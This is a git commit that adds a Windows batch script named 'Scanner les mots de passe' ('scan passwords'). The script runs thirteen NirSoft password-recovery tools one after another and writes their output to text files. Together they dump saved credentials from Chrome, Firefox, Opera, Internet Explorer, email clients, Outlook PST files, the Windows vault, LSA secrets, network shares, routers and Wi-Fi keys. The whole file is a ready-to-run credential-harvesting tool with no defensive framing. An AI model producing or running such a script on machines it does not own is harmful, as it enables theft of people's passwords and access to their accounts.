1ffdc1f9ebfeb373bdfa2c8561691bfad402c632
derlex77 <78103046+derlex77@users.noreply.github.com>
2021-12-23 00:30:06 +0100

    Add files via upload

---
+++ Scanner les mots de passe.bat
@@ -0,0 +1,14 @@
+@echo off
+start BulletsPassView.exe /stext BulletsPassView.txt
+start ChromePass.exe /stext ChromePass.txt
+start iepv.exe /stext iepv.txt
+start LSASecretsView.exe /stext LSASecretsView.txt
+start mailpv.exe /stext mailpv.txt
+start netpass.exe /stext netpass.txt
+start OperaPassView.exe /stext OperaPassView.txt
+start PasswordFox.exe /stext PasswordFox.txt
+start PstPassword.exe /stext PstPassword.txt
+start RouterPassView.exe /stext RouterPassView.txt
+start VaultPasswordView.exe /stext VaultPasswordView.txt
+start WebBrowserPassView.exe /stext WebBrowserPassView.txt
+start WirelessKeyView.exe /stext WirelessKeyView.txt
